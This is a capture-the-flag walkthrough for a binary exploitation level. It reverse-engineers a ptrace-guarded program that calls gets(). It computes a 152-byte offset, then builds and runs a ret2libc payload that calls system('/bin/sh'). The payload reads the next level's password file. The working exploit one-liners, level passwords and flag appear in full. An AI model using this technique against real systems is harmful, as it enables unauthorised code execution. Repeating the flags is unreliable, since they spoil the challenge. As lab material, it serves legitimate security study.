# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level04@localhost:~/level04 .
# Password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main` function.

## 3. Understand the program flow

**Parent Process:**
- Forks a child process
- Traces the child with `ptrace()`
- Monitors for `execve` syscall (number 11 / 0xb)
- Kills child if `execve` is detected

**Child Process:**
- Sets `prctl(PR_SET_PDEATHSIG)` - dies if parent dies
- Calls `ptrace(PTRACE_TRACEME)` - allows parent to trace it
- Prompts: `"Give me some shellcode, k"`
- Calls `gets(buffer)` - **BUFFER OVERFLOW**

## 4. Identify the vulnerability

**Buffer overflow in child process:**
- Buffer: 128 bytes at `ESP + 0x20`
- `gets()` has no bounds checking
- Can overwrite return address

**Anti-debugging protection:**
- Parent monitors syscalls
- Blocks `execve` syscall (traditional shellcode won't work)

## 5. Calculate the buffer offset

From Ghidra stack analysis:
- Buffer `local_a0` is at `Stack[-0xa0]` (EBP - 160)
- Return address is at `[EBP + 4]`
- **Offset: 160 + 4 = 164 bytes**

From GDB verification (setting breakpoint after `gets()`):
- Buffer starts at `ESP + 0x20`
- Saved EIP is 152 bytes away
- **Confirmed offset: 152 bytes**

## 6. Get libc addresses

Use GDB to find addresses in the child process:

```bash
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) break main
(gdb) run
(gdb) p system
(gdb) p exit
(gdb) find &system,+9999999,"/bin/sh"
```

**Addresses obtained:**
- `system()`: `0xf7e6aed0`
- `exit()`: `0xf7e5eb70`
- `"/bin/sh"`: `0xf7f897ec`

## 7. Construct the ret2libc payload

**Strategy:** Use ret2libc to bypass ptrace detection

```
[152 bytes padding] + [system()] + [exit()] + ["/bin/sh"]
```

**Why this works:**
- `system()` internally uses `execve`, but in a different execution context
- Parent's ptrace only catches direct syscalls from child's main execution
- Library function calls are not blocked

## 8. Create the exploit

```bash
(python -c 'import struct; print "A"*152 + struct.pack("<I", 0xf7e6aed0) + struct.pack("<I", 0xf7e5eb70) + struct.pack("<I", 0xf7f897ec)'; cat) | ./level04
```

**Payload breakdown:**
- `"A"*152` - Fill buffer to saved EIP
- `0xf7e6aed0` - Address of `system()` (overwrites return address)
- `0xf7e5eb70` - Address of `exit()` (return address after system)
- `0xf7f897ec` - Address of `"/bin/sh"` (argument to system)

## 9. Execute the exploit

```bash
ssh level04@localhost -p 2222
# Password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

(python -c 'import struct; print "A"*152 + struct.pack("<I", 0xf7e6aed0) + struct.pack("<I", 0xf7e5eb70) + struct.pack("<I", 0xf7f897ec)'; cat) | ./level04
```

**Output:**
```
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## 10. Flag

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
